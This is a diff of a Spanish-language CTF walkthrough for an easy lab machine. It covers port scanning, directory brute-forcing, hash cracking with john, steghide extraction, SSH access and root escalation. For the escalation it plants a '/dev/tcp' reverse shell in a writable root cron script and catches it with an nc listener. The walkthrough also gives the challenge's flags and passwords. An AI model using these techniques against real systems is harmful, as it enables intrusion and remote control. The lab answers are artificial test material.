@@ -3,24 +3,7 @@
 ```
 nmap -Pn -sV --min-rate 5000 10.10.87.113 -vv -p-
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 22:09 CDT
-NSE: Loaded 46 scripts for scanning.
-Initiating Parallel DNS resolution of 1 host. at 22:09
-Completed Parallel DNS resolution of 1 host. at 22:09, 0.03s elapsed
-Initiating SYN Stealth Scan at 22:09
-Scanning 10.10.87.113 [65535 ports]
-Discovered open port 80/tcp on 10.10.87.113
-Increasing send delay for 10.10.87.113 from 0 to 5 due to 472 out of 1572 dropped probes since last increase.
-Discovered open port 6498/tcp on 10.10.87.113
-Increasing send delay for 10.10.87.113 from 5 to 10 due to max_successful_tryno increase to 4
-Discovered open port 65524/tcp on 10.10.87.113
-Increasing send delay for 10.10.87.113 from 10 to 20 due to max_successful_tryno increase to 5
-Completed SYN Stealth Scan at 22:09, 16.10s elapsed (65535 total ports)
-Initiating Service scan at 22:09
-Scanning 3 services on 10.10.87.113
-Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
-Completed Service scan at 22:09, 11.58s elapsed (3 services on 1 host)
-NSE: Script scanning 10.10.87.113.
-NSE: Starting runlevel 1 (of 2) scan.
+ NSE: Starting runlevel 1 (of 2) scan.
 Initiating NSE at 22:09
 Completed NSE at 22:09, 0.80s elapsed
 NSE: Starting runlevel 2 (of 2) scan.
@@ -43,21 +26,21 @@ Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
 
 ```
 
-How many ports are open?  
+### How many ports are open?  
 3
 
-What is the version of nginx?  
+### What is the version of nginx?  
 1.16.1
 
-What is running on the highest port?
+### What is running on the highest port?
 Apache
 
-## Task 2 Compromising the machine
+### Task 2 Compromising the machine
 
 #### Using GoBuster, find flag 1.  
 
 ```
-gobuster dir -u http://10.10.87.113/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50
+gobuster dir -u http://10.10.87.113/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -81,7 +64,7 @@ Finished
 ===============================================================
 ```
 
-- nada en /hidden, sigues
+#### nada en /hidden, sigues
 ```
  gobuster dir -u http://10.10.87.113/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50
 ===============================================================
@@ -108,7 +91,7 @@ Finished
 
 ```
 
-- encuentras /hidden/whatever
+#### encuentras /hidden/whatever
 ```
 body>
 <center>
@@ -124,8 +107,10 @@ flag{f1rs7_fl4g}
 
 
 
-#### Further enumerate the machine, what is flag 2?  
+### Further enumerate the machine, what is flag 2?  
 
+#### Veamos el robots.txt
+- econtramos un hash
 ```
 10.10.87.113:65524/robots.txt
 
@@ -135,7 +120,10 @@ Robots Not Allowed
 User-Agent:a18672860d0510e5ab6699730763b250
 Allow:/
 This Flag Can Enter But Only This Flag No More Exceptions
+```
+#### Identificamos el hash con hashid
 
+```
 >> identificamos hash
 
 hashid a18672860d0510e5ab6699730763b250
@@ -159,31 +147,39 @@ Analyzing 'a18672860d0510e5ab6699730763b250'
 [+] DNSSEC(NSEC3) 
 [+] RAdmin v2.x 
 
+````
 
+#### Vamos a crackear el hash
+- podemos probar crack station pero no lo encuentra
+- lo buscamos en google y aparece
+
+```
 >> crackeamos
 
 https://md5hashing.net/
 flag{1m_s3c0nd_fl4g}
 ```
 
-#### Crack the hash with easypeasy.txt, What is the flag 3?  
+### Crack the hash with easypeasy.txt, What is the flag 3?  
 
+
+
+#### En la pagina del sitio con el puerto: 65524, a simple vista hay una bandera
 http://10.10.87.113:65524/
 
 ```
 They are activated by symlinking available configuration files from their respective Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} *-available/ counterparts. These should be managed by using our helpers a2enmod, a2dismod, a2ensite, a2dissite, and a2enconf, a2disconf . See their respective man pages for detailed information.
 
->> crackeamos hash , crackstation
-candeger
-
 flag{9fdafbd64c47471a8f54cd3fc64cd312}
 
-
 ```
+r> flag{9fdafbd64c47471a8f54cd3fc64cd312}
+### What is the hidden directory?  : 
 
-- What is the hidden directory?  : 
-/n0th1ng3ls3m4tt3r
 
+#### Visualizamos el  el código fuente de la pagina con el puerto: 65524
+
+- encontramos un hash en base 62
 ```
 En el codigo fuente
 
@@ -196,16 +192,20 @@ body>
 	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
         </span>
       </div>
-
->> crackeamos cyberchef / base62
+```
+#### crackeamos cyberchef / base62
+```
+>> 
 
 /n0th1ng3ls3m4tt3r
 
 ```
 
-#### Using the wordlist that provided to you in this task crack the hash  what is the password?
-
+### Using the wordlist that provided to you in this task crack the hash  what is the password?
 mypasswordforthatjob
+####  Visualizamos el código fuente en el directorio oculto /n0th1ng3ls3m4tt3r
+
+- de la página y encontramos un hash
 
 ```
 <html>
@@ -225,13 +225,16 @@ mypasswordforthatjob
 </center>
 </body>
 </html>
+```
 
 
->> crackeamos el hash con la lista que nos dieron
+
+-  Primero vemos que tipo de hash es: sha-256, o GOST
+#### Identificamos el tipo de hash con hash-identifier  
+
+```
+
 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
-
-> Primero vemos que tipo de hash es
-
 
 hash-identifier                                                        
    
@@ -243,16 +246,31 @@ Possible Hashs:
 
 Least Possible Hashs:
 [+] GOST R 34.11-94
-[+] RipeMD-256
-[+] SNEFRU-256
-[+] SHA-256(HMAC)
-[+] Haval-256(HMAC)
-[+] RipeMD-256(HMAC)
-[+] SNEFRU-256(HMAC)
-[+] SHA-256(md5($pass))
-[+] SHA-256(sha1($pass))
-john --list=formats
+ 
+```
 
+#### Descargamos la lista de palabras que nos dan: easypeasy_1596838725703.txt
+```
+ls    
+ 
+easypeasy_1596838725703.txt
+```
+
+#### Listamos los formatos de john
+
+```
+john --list=formats 
+```
+
+#### Probamos sha256 y fall
+```
+john hash --format=sha256crypt -w=easypeasy.txt
+
+```
+
+#### Probamos GOST y funciona
+
+```
 > le aplicamos john
 
 john hash --format=GOST -w=easypeasy_1596838725703.txt
@@ -265,20 +283,20 @@ mypasswordforthatjob (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.>)
 
-
 mypasswordforthatjob
 
 ```
 
 
-#### What is the password to login to the machine via SSH?
+### What is the password to login to the machine via SSH?
 
+#### Descargamos una imagen del puerto 6554/n0th1ng3ls3m4tt3r
 http://10.10.87.113:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
 
-- descargamos la imagen y le sacamos la info con el pass anterior
+#### Extraemos el texto oculto con steghide
 
 ```
-teghide --extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
+steghide --extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
 wrote extracted data to "secrettext.txt".
 
 cat secrettext.txt       
@@ -286,15 +304,19 @@ username:boring
 password:
 01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
 
+```
+#### Decodificamos el texto con cyberchef
+```
 >> cyberchef
 iconvertedmypasswordtobinary
-
-
 ```
 
-#### What is the user flag?
+### What is the user flag?
 
-- Ingresamos por ssh
+#### Ingresamos por ssh, con el user boring y el password: iconvertedmypasswordtobinary
+
+- hay que especificar el puerto correcto 6498
+
 ```
 ssh boring@10.10.2.7 -p 6498
 The authenticity of host '[10.10.2.7]:6498 ([10.10.2.7]:6498)' can't be established.
@@ -316,21 +338,33 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 !!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
 boring@kral4-PC:~$ 
 
+```
+#### Listamos archivos y encontralos el user.txt 
+```
 boring@kral4-PC:~$ pwd
 /home/boring
 boring@kral4-PC:~$ cat user.txt 
 User Flag But It Seems Wrong Like It`s Rotated Or Something
 synt{a0jvgf33zfa0ez4y}
 boring@kral4-PC:~$ 
-
+```
+#### Lo decodificamos de rot13 con cyberchef
+```
 >> Rot13
 flag{n0wits33msn0rm4l}
-
-
 ```
 
+### What is the root flag?
 
-#### What is the root flag?
+### Probamos sudo -l sin exito
+```
+boring@kral4-PC:~$ sudo -l
+[sudo] password for boring: 
+Sorry, user boring may not run sudo on kral4-PC.
+
+```
+#### Revisamos el crontab
+- encontramos .mysecretcronjob.sh corriendo a intervalos de 1 minuto
 
 ```
 boring@kral4-PC:~$ cat /etc/crontab 
@@ -355,26 +389,52 @@ boring@kral4-PC:~$
 
 ```
 
-- vemos el contenido del script
+#### Vemos los permisos y el contenido del script
+
+- tenemos permisos de escritura sobre el
 ```
 boring@kral4-PC:~$ ls -la /var/www/.mysecretcronjob.sh 
 -rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
+```
+
+#### Vemos el contenido del script
+```
 boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
 #!/bin/bash
 # i will run as root
+```
 
+#### Modificamos el script para plantar un reverse shell hacia nuestra maquina kali
+
+- vamos a la pagina de reverse shell generator y crafteamos el shell
+
+```
 >> modificamos el script
 nano /var/www/.mysecretcronjob.sh 
 
 cat /var/www/.mysecretcronjob.sh 
 #!/bin/bash
 # i will run as root
-sh -i >& /dev/tcp/10.2.4.107/1234 0>&1
+sh -i >& /dev/tcp/10.2.4.107/3939 0>&1
 
->> Ponemos el listener del otro lado
+```
+#### Ponemos en escucha nuestra maquina
+```
+nc -lnvp 3939         
+listening on [any] 3939 ...
+connect to [10.13.81.73] from (UNKNOWN) [10.10.76.203] 60336
+sh: 0: can't access tty; job control turned off
+# 
 
-nc -lnvp 1234
 
+````
+
+#### Una vez con shell sacamos la bandera
+```
+nc -lnvp 3939         
+listening on [any] 3939 ...
+connect to [10.13.81.73] from (UNKNOWN) [10.10.76.203] 60336
+sh: 0: can't access tty; job control turned off
 # cd /root
 # ls -la
 total 40
@@ -390,5 +450,7 @@ drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
 -rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
 # cat .root.txt
 flag{63a9f0ea7bb98050796b649e85481845}
+# 
+
 
 ```
